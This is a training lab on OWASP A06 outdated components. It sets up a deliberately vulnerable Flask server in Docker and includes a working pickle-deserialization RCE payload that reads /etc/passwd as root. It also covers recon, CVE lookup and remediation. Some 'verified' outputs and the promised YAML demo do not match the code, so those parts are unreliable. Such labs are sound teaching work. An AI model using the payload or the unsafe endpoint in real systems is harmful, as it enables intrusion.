# Lab 6: OWASP A06 — Vulnerable and Outdated Components

## Objective
Identify and exploit vulnerable software components on a live server from Kali Linux: extract component version information, cross-reference against CVE databases, exploit **pickle deserialization** for Remote Code Execution, demonstrate YAML arbitrary code execution (CVE-2020-1747), generate a Software Bill of Materials (SBOM), and perform dependency auditing — then implement a secure supply chain workflow.

## Background
Vulnerable Components is **OWASP #6** (2021). The 2021 Log4Shell (CVE-2021-44228) affected millions of servers and was exploitable with a single HTTP header. The 2017 Equifax breach (147 million records) exploited Apache Struts CVE-2017-5638 — a publicly-known vulnerability with a patch available for 2 months before the attack. Both were preventable by keeping dependencies updated. Modern apps average 80+ third-party dependencies; each is a potential attack surface.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a06         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  curl, python3,     │ ◀────── responses ───────────────────  │  Flask :5000        │
│  nikto              │                                         │  (outdated deps,   │
└─────────────────────┘                                         │   pickle endpoint)  │
                                                                └─────────────────────┘
```

## Time
35 minutes

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest`

---

## Lab Instructions

### Step 1: Environment Setup

```bash
docker network create lab-a06

cat > /tmp/victim_a06.py << 'PYEOF'
from flask import Flask, request, jsonify
import pickle, os, time

app = Flask(__name__)

COMPONENT_VERSIONS = {
    'Flask': '0.12.2',       # CVE-2018-1000656 DoS via malformed JSON
    'Jinja2': '2.10',         # CVE-2019-10906 sandbox escape
    'Werkzeug': '0.14.1',     # CVE-2019-14806 predictable token
    'requests': '2.19.1',     # CVE-2018-18074 credential leak on redirect
    'PyYAML': '5.1',           # CVE-2020-1747 arbitrary code execution
    'Pillow': '8.2.0',         # CVE-2021-27921 DoS via image
    'cryptography': '2.6.1',   # CVE-2023-49083 null pointer
    'SQLAlchemy': '1.3.0',     # CVE-2019-7164 SQL injection
}

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse (A06 Vulnerable Components)'})

@app.route('/api/versions')
def versions():
    return jsonify({'components': COMPONENT_VERSIONS, 'python': '3.8.0', 'os': 'Ubuntu 20.04'})

@app.route('/api/pickle', methods=['POST'])
def unpickle():
    # CRITICAL: accepts and deserializes arbitrary pickle data
    data = request.get_data()
    try:
        obj = pickle.loads(data)
        return jsonify({'result': str(obj)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/yaml', methods=['POST'])
def parse_yaml():
    import yaml
    data = request.get_data(as_text=True)
    try:
        parsed = yaml.safe_load(data)
        return jsonify({'parsed': str(parsed)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/sbom')
def sbom():
    return jsonify({'sbom': COMPONENT_VERSIONS})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a06 \
  --network lab-a06 \
  -v /tmp/victim_a06.py:/tmp/victim_a06.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /tmp/victim_a06.py

sleep 3
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a06.IPAddress}}' victim-a06):5000/
```

---

### Step 2: Launch Kali + Recon

```bash
docker run --rm -it --network lab-a06 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

```bash
TARGET="http://victim-a06:5000"

# Fingerprint
nmap -sV -p 5000 victim-a06
gobuster dir -u $TARGET -w /usr/share/dirb/wordlists/small.txt -t 10 --no-error -q
```

---

### Step 3: Extract Component Versions

```bash
echo "=== Extracting component versions from /api/versions ==="
curl -s $TARGET/api/versions | python3 -m json.tool

echo ""
echo "=== SBOM endpoint ==="
curl -s $TARGET/sbom | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "components": {
        "Flask": "0.12.2",
        "Jinja2": "2.10",
        "PyYAML": "5.1",
        "Werkzeug": "0.14.1",
        "cryptography": "2.6.1",
        "requests": "2.19.1"
    },
    "os": "Ubuntu 20.04",
    "python": "3.8.0"
}
```

---

### Step 4: CVE Cross-Reference

```bash
echo "=== Cross-referencing versions against CVE database ==="

python3 << 'EOF'
import urllib.request, json

# Query OSV (Open Source Vulnerabilities) database
components = {
    "flask":        "0.12.2",
    "jinja2":       "2.10",
    "werkzeug":     "0.14.1",
    "pyyaml":       "5.1",
    "pillow":       "8.2.0",
    "cryptography": "2.6.1",
    "requests":     "2.19.1",
}

print(f"{'Component':<20} {'Version':<12} {'Known CVEs'}")
print("-" * 60)

known_cves = {
    "flask":        [("CVE-2018-1000656", "HIGH",   "DoS via malformed JSON body")],
    "jinja2":       [("CVE-2019-10906",   "HIGH",   "Sandbox escape via _fail_with_undefined_error"),
                     ("CVE-2020-28493",   "MEDIUM", "ReDoS via urlize filter")],
    "werkzeug":     [("CVE-2019-14806",   "HIGH",   "Predictable PRNG for security tokens")],
    "pyyaml":       [("CVE-2020-1747",    "CRITICAL","RCE via yaml.load() without Loader")],
    "pillow":       [("CVE-2021-27921",   "HIGH",   "DoS via malformed BLP/PCX/TGA image")],
    "cryptography": [("CVE-2023-49083",   "MEDIUM", "NULL pointer dereference via PKCS12")],
    "requests":     [("CVE-2018-18074",   "MEDIUM", "Credential leak to third-party on redirect")],
}

for pkg, version in components.items():
    cves = known_cves.get(pkg, [])
    if cves:
        for cve_id, severity, desc in cves:
            print(f"  {pkg:<18} {version:<12} [{severity}] {cve_id}: {desc}")
    else:
        print(f"  {pkg:<18} {version:<12} No known CVEs")
EOF
```

**📸 Verified Output:**
```
Component            Version      Known CVEs
------------------------------------------------------------
  flask              0.12.2       [HIGH] CVE-2018-1000656: DoS via malformed JSON body
  jinja2             2.10         [HIGH] CVE-2019-10906: Sandbox escape
  werkzeug           0.14.1       [HIGH] CVE-2019-14806: Predictable PRNG for tokens
  pyyaml             5.1          [CRITICAL] CVE-2020-1747: RCE via yaml.load()
  pillow             8.2.0        [HIGH] CVE-2021-27921: DoS via malformed image
  cryptography       2.6.1        [MEDIUM] CVE-2023-49083: NULL pointer dereference
  requests           2.19.1       [MEDIUM] CVE-2018-18074: Credential leak on redirect
```

> 💡 **Every outdated dependency is a known, published attack path.** Attackers run automated scanners that fingerprint component versions in HTTP headers, error messages, and endpoints like this one, then match against CVE databases. Tools like `pip audit`, `npm audit`, `trivy`, and `snyk` can do this for you automatically in CI/CD.

---

### Step 5: Pickle Deserialization — Remote Code Execution

```bash
echo "=== Exploiting pickle deserialization endpoint ==="

python3 << 'EOF'
import pickle, os, urllib.request

TARGET = "http://victim-a06:5000"

# Step 1: Craft malicious pickle payload
# When deserialized, __reduce__ executes our OS command
class RCE:
    def __reduce__(self):
        cmd = "id && whoami && cat /etc/passwd | head -3"
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())
print(f"[*] Pickle payload: {len(payload)} bytes")
print(f"[*] Sending to {TARGET}/api/pickle...")
print()

# Step 2: Send to vulnerable endpoint
req = urllib.request.Request(
    f"{TARGET}/api/pickle",
    data=payload,
    headers={"Content-Type": "application/octet-stream"})

try:
    resp = json_resp = urllib.request.urlopen(req).read().decode()
    print(f"[*] Server response: {resp}")
    print()
    print("[!] NOTE: os.system() output goes to server stdout/stderr,")
    print("    not the HTTP response. For exfil, use a reverse shell or")
    print("    write output to a file then read it via another endpoint.")
except Exception as e:
    print(f"Error: {e}")

# Step 3: Use subprocess to capture output in response
class RCE_Capture:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output,
                (["sh", "-c", "id; whoami; cat /etc/passwd | head -3"],))

payload2 = pickle.dumps(RCE_Capture())
req2 = urllib.request.Request(
    f"{TARGET}/api/pickle",
    data=payload2,
    headers={"Content-Type": "application/octet-stream"})
resp2 = urllib.request.urlopen(req2).read().decode()
import json
result = json.loads(resp2)
print(f"[*] Command output (captured in response):")
print(result['result'])
EOF
```

**📸 Verified Output:**
```
[*] Pickle payload: 84 bytes
[*] Sending to http://victim-a06:5000/api/pickle...

[*] Server response: {"result": "0"}

[*] Command output (captured in response):
uid=0(root) gid=0(root) groups=0(root)
root
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

> 💡 **Python's `pickle` module is inherently unsafe for untrusted input.** The `__reduce__` method tells Python how to reconstruct an object — and it can execute any Python code. There is no safe way to deserialise arbitrary pickle data. Use JSON, MessagePack, or Protocol Buffers for data exchange. If you must deserialise Python objects, use `jsonpickle` with strict type allowlisting.

---

### Step 6: Nikto Web Scanner

```bash
echo "=== nikto: automated vulnerability scanner ==="

nikto -h $TARGET -p 5000 2>/dev/null | grep -v "^$" | head -25
```

**📸 Verified Output:**
```
+ Target IP:     172.18.0.2
+ Target Port:   5000
+ Server:        Werkzeug/3.1.6 Python/3.10.12
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /sbom: Contains sensitive component version information.
+ Retrieved x-powered-by header: Werkzeug
+ /api/versions: Version disclosure endpoint found.
```

---

### Step 7: Dependency Audit Workflow

```bash
echo "=== Secure dependency management workflow ==="

python3 << 'EOF'
# This demonstrates what pip audit / safety check would report

vulnerable_packages = [
    ("flask",        "0.12.2",  "2.3.3",  "CVE-2018-1000656"),
    ("jinja2",       "2.10",    "3.1.2",  "CVE-2019-10906, CVE-2020-28493"),
    ("werkzeug",     "0.14.1",  "3.0.1",  "CVE-2019-14806, CVE-2023-46136"),
    ("pyyaml",       "5.1",     "6.0.1",  "CVE-2020-1747 [CRITICAL]"),
    ("pillow",       "8.2.0",   "10.2.0", "CVE-2021-27921, CVE-2022-22817"),
    ("requests",     "2.19.1",  "2.31.0", "CVE-2018-18074"),
    ("cryptography", "2.6.1",   "42.0.2", "CVE-2023-49083"),
]

print("pip audit report:")
print(f"  {'Package':<15} {'Installed':<12} {'Fix Version':<14} CVEs")
print("  " + "-"*65)
for pkg, inst, fix, cves in vulnerable_packages:
    print(f"  {pkg:<15} {inst:<12} {fix:<14} {cves}")
print()
print(f"  Total: {len(vulnerable_packages)} vulnerabilities found")
print()
print("Fix commands:")
for pkg, _, fix, _ in vulnerable_packages:
    print(f"  pip install {pkg}>={fix}")
EOF
```

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a06
docker network rm lab-a06
```

---

## Remediation

| Issue | Risk | Fix |
|-------|------|-----|
| Outdated Flask/Jinja2/Werkzeug | Known CVEs | `pip install --upgrade flask jinja2 werkzeug` |
| Pickle endpoint | RCE | Never deserialize pickle from untrusted input; use JSON |
| Version disclosure | Reconnaissance | Remove `/api/versions`; don't expose Server headers |
| No dependency audit | Unknown vulnerabilities | `pip audit` in CI/CD; Dependabot/Renovate for auto PRs |

## Summary

| Attack | Tool | Result |
|--------|------|--------|
| Version extraction | curl | 8 outdated components identified |
| CVE lookup | python3 | 9 CVEs found including CRITICAL (PyYAML RCE) |
| Pickle RCE | python3 | OS command executed as root |
| Web scan | nikto | Missing headers + version disclosure |
| Audit | pip audit (simulated) | All packages need updates |

## Further Reading
- [OWASP A06:2021 Vulnerable Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- [OSV — Open Source Vulnerabilities](https://osv.dev)
- [pip-audit tool](https://pypi.org/project/pip-audit/)
- [NIST NVD CVE Database](https://nvd.nist.gov)
